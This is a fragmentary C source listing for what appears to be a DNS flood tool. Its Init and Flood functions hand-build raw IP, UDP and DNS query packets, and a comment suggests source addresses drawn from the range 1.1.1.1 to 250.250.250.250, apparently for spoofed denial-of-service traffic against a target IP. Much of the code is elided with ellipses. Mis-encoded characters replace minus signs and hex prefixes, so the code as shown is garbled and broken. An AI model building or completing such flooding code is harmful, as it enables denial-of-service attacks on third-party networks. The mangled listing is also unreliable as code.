...
void Init( char *buffer, int buffer_size, char *ip, char *base_name )
{
    ...
    int udp_with_usd_len = total_packet_len 每 sizeof(IP_HEADER) + sizeof(USD_HEADER);
    ...
    IpHeader.frag_and_flags = 0℅0000;
    IpHeader.ttl = 255;
    IpHeader.proto = IPPROTO_UDP;
    IpHeader.checksum = 0℅0000;
   	// 1.1.1.1 〞〞〞每 250.250.250.250
    ...
    UdpHeader.uh_length = htons( total_packet_len 每 sizeof(IP_HEADER) );
    UdpHeader.uh_checksum = 0℅0000;
    ...
    DnsHeader.flags = 0℅0001;
    DnsHeader.queries = 0℅0100;
    DnsHeader.answers = 0℅0000;
    DnsHeader.auth = 0℅0000;
    DnsHeader.additional = 0℅0000;
 
    QueryHeader.type = 0℅0100;
    QueryHeader.class = 0℅0100;
    ...
    memcpy( buffer+sizeof(IpHeader), udp_packet+sizeof(UsdHeader), udp_with_usd_len 每 sizeof(USD_HEADER) );
...
void Flood( char *dst_ip, char *base_name )
{
    ...
    // 2 means, 0℅00 and the length of host, 0x03www0x06google0x03com0x00, fuck dns protocol
    int total_packet_len = sizeof(IP_HEADER) + sizeof(UDP_HEADER) + sizeof(DNS_HEADER) + sizeof(QUERY_HEADER) + strlen(base_name) + HOST_LENGTH + 2 每 sizeof(char *);
